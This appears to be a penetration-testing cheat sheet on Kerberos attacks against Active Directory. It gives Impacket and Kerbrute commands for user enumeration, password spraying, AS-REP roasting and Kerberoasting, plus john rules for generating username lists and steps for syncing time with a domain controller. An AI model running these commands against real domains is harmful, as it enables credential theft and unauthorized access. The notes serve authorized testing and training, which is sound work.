# Kerberoas

---
# Navigation
- **[Definition](#definition)**
- **[Kerberoas](#kerberoas)**
	- [Kerbrute](#kerbrute)
	- [Kerberoasting](#kerberoasting) 
- **[Synchronizing time is important](#synchronizing-time-is-important)**
- **[Further reading](#further-reading)**

---
# Definition
## What's Kerberoas
Kerberos is **an authentication protocol that works on the basis of tickets** that allows clients to connect to services over an insecure network and still allow clients to prove their identity in a secure manner.
- If a user's `UserAccountControl` settings have "Do not require kerberoas preauthentication" enabled,it's possible to grab user's crackable AS-REP and brute-force it online.
- With sufficient rights `GenericWrite` or `GenericAll`,preauth can be forced disabled as well.
## How does Kerberoas work?
1. Login.
2. Request for Ticket Granting Ticket – TGT, Client to Server.
3. Server checks if the user exists.
4. Server sends TGT back to the client.
5. Enter your password.
6. Client obtains the TGS Session Key.
7. Client requests server to access a service.
8. Server verifies if service exist.
9. Server verifies request.
10. Server generates service session key.
11. Client receives service session key.
12. Client contacts service.
13. Service receives the request.
14. Service verifies request.
15. Service confirms identity to the client.
16. Client receives confirmation.
17. Client communicates with the service.
> Detailed explaination here: https://www.vanimpe.eu/2017/05/26/kerberos-made-easy/

# Kerberoasting
The goal is to get a **TGS** and decrypt server's account hash.
> Pre-requesties: Have a username or a list of users.

## Kerbrute
 For user enumeration,Password spraying and more
 ```bash
 go get github.com/ropnop/kerbrute
```
## Impacket tools
 **impacket-GetNPUsers**: Get users with disabled `Pre-authentication`.
 ```bash
 impacket-GetNPUsers <DOMAIN>/ -dc-ip 10.10.10.240 -no-pass -usersfile usernames.txt -format john
 ```
  **impacket-lookupsid**: Performs bruteforcing of Windows SID’s to identify users/groups on the remote target.
  ```bash
  impacket-lookupsid <DOAMIN>/ -target-ip <IP>
  ```
  **impacket-GetUserSPNs**:  Find Service Principal Names that are associated with a normal user account.
 ```bash
 impacket-GetUserSPNs <DOMAIN>/<USER> -dc-ip <IP> -request
 impacket-GetUserSPNs <DOMAIN>/<USER> -dc-ip <IP> -usersfile usernames.txt -no-pass -request
 ```
  **impacket-GetADUsers**: Gather data about the domain’s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes.*If no entries are returned that means users don’t have email addresses specified so you can use **-all** option*.
 ```bash
 impacket-GetADUsers <DOMAIN>/<USER> -dc-ip <IP>
 impacket-GetADUsers <DOMAIN>/<USER> -dc-ip <IP> -all
 ```
 # Creating a list of users for bruteforcing
 - Download the rules
 ```bash
 curl https://gist.githubusercontent.com/dzmitry-savitski/65c249051e54a8a4f17a534d311ab3d4/raw/5514e8b23e52cac8534cc3fdfbeb61cbb351411c/user-name-rules.txt >> /etc/john/john.conf
 ```
 - To generate the list
 ```bash
 #Users file must be: zeyad abuqasem
 john --wordlist=first_last_names.txt --rules=Login-Generator-i --stdout > usernames.txt
 
 #For case sensitive output
 john --wordlist=first_last_names.txt --rules=Login-Generator --stdout > usernames.txt
 ```
 > Reference: https://dzmitry-savitski.github.io/2020/04/generate-a-user-name-list-for-brute-force-from-first-and-last-name
 # Synchronizing time is important
```bash
#Disable time sync on VM
sudo apt install ntpdate
sudo ntpdate <RemoteMachine-IP>

#Second method (my recommendation)
sudo apt install rdate
sudo rdate -n <DC>

#Third method 
sudo apt-get install chrony
sudo timedatectl set-ntp true 
sudo ntpdate <machine IP>

#Fourth method (xct notes)
sudo date -s "$(curl -sI <Target> | grep -i '^date:'|cut -d' ' -f2-)"
```
 
 # Further reading
 - Tutorial -> [**Impacket-Tools**](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)
- Cheatsheet -> [**Kerbrute CheatSheet**](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
- Explained -> [**Kerberoasting**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- Ticket-Conversion -> [Experimenting with Kerberos Ticket Formats (tw1sm.github.io)](https://tw1sm.github.io/2021-02-01-kerberos-conversion/)
